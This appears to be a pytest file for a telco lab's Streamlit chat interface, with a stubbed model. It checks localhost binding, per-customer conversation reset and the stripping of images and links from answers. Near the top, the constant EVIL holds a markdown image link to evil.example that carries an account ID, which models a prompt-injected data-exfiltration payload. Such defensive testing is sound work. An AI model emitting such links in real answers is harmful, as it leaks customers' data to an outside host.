"""The Streamlit page, run headlessly with Streamlit's AppTest (no browser, no model spend)."""

from pathlib import Path

import pytest
from streamlit import config as st_config
from streamlit.testing.v1 import AppTest

from telco_mcp_lab.chat_ui import session
from telco_mcp_lab.chat_ui.session import TurnOutcome
from telco_mcp_lab.harness import models

APP = str(Path(__file__).parents[2] / "src/telco_mcp_lab/chat_ui/app.py")
EVIL = "![x](https://evil.example/?d=ACC-1001)"


@pytest.fixture
def localhost():
    previous = st_config.get_option("server.address")
    st_config.set_option("server.address", "127.0.0.1")
    yield
    st_config.set_option("server.address", previous)


@pytest.fixture
def fake_model(monkeypatch):
    """One configured provider and a canned turn: no network, no spend."""
    calls: list[tuple] = []
    monkeypatch.setattr(models, "configured", lambda: ["claude"])
    monkeypatch.setattr(models, "model_name", lambda p: "claude-opus-5")

    async def run_turn(cfg, state, prompt, **kw):
        calls.append((cfg, prompt))
        state.history = [{"role": "system", "content": "s"}, {"role": "user", "content": prompt}]
        return TurnOutcome(
            answer=f"Hello {EVIL} done", stopped_reason="answered",
            tool_calls=[{"name": "list_orders", "arguments": {}, "is_error": False,
                         "result": '{"items": []}'}],
            events=[{"kind": "llm", "step": 1, "tool_calls": [{"name": "list_orders"}],
                     "usage": {"prompt_tokens": 5, "completion_tokens": 2}},
                    {"kind": "tool_call", "name": "list_orders", "arguments": {}},
                    {"kind": "tool_result", "name": "list_orders", "is_error": False,
                     "content": '{"items": []}'}],
            seconds=0.1, model="claude:claude-opus-5",
        )  # fmt: skip

    monkeypatch.setattr(session, "run_turn", run_turn)
    return calls


def all_markdown(at: AppTest) -> str:
    return "\n".join(m.value for m in at.markdown)


@pytest.mark.security
def test_refuses_to_run_unless_bound_to_localhost(fake_model):
    at = AppTest.from_file(APP, default_timeout=30).run()
    assert at.error and "localhost" in at.error[0].value
    assert not at.chat_input


def test_no_configured_model_is_explained(localhost, monkeypatch):
    monkeypatch.setattr(models, "configured", lambda: [])
    at = AppTest.from_file(APP, default_timeout=30).run()
    assert at.error and "CHAT_CLAUDE_API_KEY" in at.error[0].value


@pytest.mark.security
def test_answer_rendered_without_images_or_links(localhost, fake_model):
    at = AppTest.from_file(APP, default_timeout=30).run()
    assert not at.exception
    at.chat_input[0].set_value("show my orders").run()
    assert not at.exception
    md = all_markdown(at)
    assert "Hello" in md and "done" in md
    assert "![" not in md and "](" not in md  # the injected image is gone
    assert any("1 tool call(s)" in e.label for e in at.expander)
    (cfg, prompt) = fake_model[0]
    assert prompt == "show my orders" and cfg.identity == "lab" and cfg.caller == "alice"


@pytest.mark.security
def test_changing_the_customer_starts_a_new_conversation(localhost, fake_model):
    at = AppTest.from_file(APP, default_timeout=30).run()
    at.sidebar.radio[0].set_value("shared").run()
    at.chat_input[0].set_value("my account").run()
    assert "Hello" in all_markdown(at)
    at.sidebar.text_input[1].set_value("ACC-2001").run()  # [0] is the connector config
    assert "Hello" not in all_markdown(at)  # previous customer's conversation is gone
    assert at.info and "new conversation" in at.info[0].value
